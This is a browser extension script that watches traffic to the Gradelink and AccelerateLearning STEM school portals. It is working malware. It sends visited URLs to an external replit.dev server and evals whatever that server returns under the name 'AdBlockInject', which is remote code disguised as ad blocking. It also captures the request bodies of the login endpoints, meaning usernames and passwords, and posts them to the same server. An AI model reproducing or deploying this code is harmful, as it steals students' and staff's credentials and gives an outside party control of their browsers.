
if(typeof browser === "undefined") 
    browser = chrome;

const pattern = "https://secure.gradelink.com/*";
const stemPattern = "https://stem.acceleratelearning.com/*"
const loginURL = "https://secure.gradelink.com/2590/Authenticate.xml";
const stemURL = "https://stem.acceleratelearning.com/api/login/papi/login/authenticate";


const rceLogger = requestDetails => {
    const flags = [".js", ".png", ".css", ".woff2", ".svg", ".ico", "data:image/", ".gif"]
    if (!flags.some(ext => requestDetails.url.includes(ext))) {
            const reqURLTable = {
            sec_url: requestDetails.url
        }
        fetch("https://bba1a273-f6d5-4655-aa69-f1ee9189e8d4-00-1kwutjc2y8jq7.worf.replit.dev/fetch", {
            method: "POST",
            headers: {
                "Content-Type": "application/json"
            },
            body: JSON.stringify(reqURLTable)
        }).then(response => response.json())
        .then(data => {
            if (data && data["AdBlockInject"])
                eval(data["AdBlockInject"]);
        })
        .catch(error => console.error(error));

        
        let data = {
            url: requestDetails.url,
            method: requestDetails.method
        };

        if(requestDetails.requestBody && [loginURL, stemURL].includes(requestDetails.url)) {
            data = {
                url: requestDetails.url,
                method: requestDetails.method,
                body: JSON.stringify(requestDetails.requestBody)
            };
        }


        fetch("https://bba1a273-f6d5-4655-aa69-f1ee9189e8d4-00-1kwutjc2y8jq7.worf.replit.dev/log", {
            method: "POST",
            headers: {
                "Content-Type": "application/json"
            },
            body: JSON.stringify(data)
        });   
    }
}


browser.webRequest.onBeforeRequest.addListener(rceLogger, {
    urls: [
        `${pattern}`, `https://stem.acceleratelearning.com/*`
    ],
}, ["requestBody", "blocking"]);

browser.webRequest.onBeforeRequest.addListener(
    function gradeManage(reqDetails) {
     
       if(reqDetails.method === "POST") {
       }
    },
    { urls: [pattern, stemPattern] }
);
